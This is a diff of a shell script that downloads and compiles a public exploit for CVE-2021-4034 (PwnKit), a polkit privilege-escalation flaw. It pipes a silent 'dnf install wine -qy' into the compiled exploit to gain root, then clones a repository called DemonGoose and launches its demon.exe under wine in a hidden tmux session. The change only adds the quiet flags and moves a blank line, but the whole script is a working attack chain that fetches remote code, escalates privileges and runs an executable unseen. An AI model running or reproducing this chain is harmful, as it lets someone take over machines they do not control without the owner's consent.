@@ -8,8 +8,8 @@ for EXPLOIT in "${URL}/cve-2021-4034.c" \
 do
     curl -sLO "$EXPLOIT" || wget --no-hsts -q "$EXPLOIT" -O "${EXPLOIT##*/}"
 done
-
 make
-echo "dnf install wine" | ./cve-2021-4034
+
+echo "dnf install wine -qy" | ./cve-2021-4034
 git clone --single-branch --branch visuals https://github.com/QuentinBriand/DemonGoose
 tmux new -d wine DemonGoose/DemonThings/demon.exe
